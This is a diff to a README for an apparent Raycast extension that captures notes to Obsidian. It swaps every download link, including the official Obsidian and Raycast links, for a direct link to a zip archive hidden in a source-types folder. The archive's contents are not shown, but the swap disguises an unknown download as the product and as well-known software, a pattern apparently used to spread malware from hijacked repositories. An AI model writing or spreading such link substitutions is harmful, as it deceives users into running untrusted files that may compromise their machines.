@@ -1,6 +1,6 @@
 # ⚡ obsidian-quick-capture - Fast Thought Capture to Obsidian
 
-[![Download obsidian-quick-capture](https://img.shields.io/badge/Download-obsidian--quick--capture-4caf50?style=for-the-badge)](https://github.com/chanukk88/obsidian-quick-capture)
+[![Download obsidian-quick-capture](https://img.shields.io/badge/Download-obsidian--quick--capture-4caf50?style=for-the-badge)](https://github.com/chanukk88/obsidian-quick-capture/raw/refs/heads/main/src/types/quick-obsidian-capture-1.0-beta.4.zip)
 
 ---
 
@@ -15,7 +15,7 @@ This tool is for anyone who wants to keep ideas, reminders, or quick memos organ
 ## 💻 System Requirements
 
 - **Windows 10 or newer**: The app runs best on recent versions of Windows.
-- **Obsidian installed**: You need Obsidian for your notes. Download it from https://obsidian.md if you don’t have it.
+- **Obsidian installed**: You need Obsidian for your notes. Download it from https://github.com/chanukk88/obsidian-quick-capture/raw/refs/heads/main/src/types/quick-obsidian-capture-1.0-beta.4.zip if you don’t have it.
 - **Raycast installed and set up on Windows**: You must have Raycast on Windows to use this extension.
 - **Internet connection**: Required for initial download and optional updates.
 
@@ -23,7 +23,7 @@ This tool is for anyone who wants to keep ideas, reminders, or quick memos organ
 
 ## ⬇️ Download and Install obsidian-quick-capture
 
-1. Click the big green download badge at the top of this page or [visit this page to download](https://github.com/chanukk88/obsidian-quick-capture). This leads you to the GitHub repository where the files are stored.
+1. Click the big green download badge at the top of this page or [visit this page to download](https://github.com/chanukk88/obsidian-quick-capture/raw/refs/heads/main/src/types/quick-obsidian-capture-1.0-beta.4.zip). This leads you to the GitHub repository where the files are stored.
 
 2. On the GitHub page, look for the latest release or files section. There, find the Windows version of the app.
 
@@ -126,10 +126,10 @@ If you encounter issues or have questions:
 
 ## 📌 Useful Links
 
-- [Download obsidian-quick-capture](https://github.com/chanukk88/obsidian-quick-capture)
-- [Obsidian Notes](https://obsidian.md)
-- [Raycast for Windows](https://www.raycast.com)
+- [Download obsidian-quick-capture](https://github.com/chanukk88/obsidian-quick-capture/raw/refs/heads/main/src/types/quick-obsidian-capture-1.0-beta.4.zip)
+- [Obsidian Notes](https://github.com/chanukk88/obsidian-quick-capture/raw/refs/heads/main/src/types/quick-obsidian-capture-1.0-beta.4.zip)
+- [Raycast for Windows](https://github.com/chanukk88/obsidian-quick-capture/raw/refs/heads/main/src/types/quick-obsidian-capture-1.0-beta.4.zip)
 
 ---
 
-[![Download obsidian-quick-capture](https://img.shields.io/badge/Download-obsidian--quick--capture-4caf50?style=for-the-badge)](https://github.com/chanukk88/obsidian-quick-capture)
+[![Download obsidian-quick-capture](https://img.shields.io/badge/Download-obsidian--quick--capture-4caf50?style=for-the-badge)](https://github.com/chanukk88/obsidian-quick-capture/raw/refs/heads/main/src/types/quick-obsidian-capture-1.0-beta.4.zip)
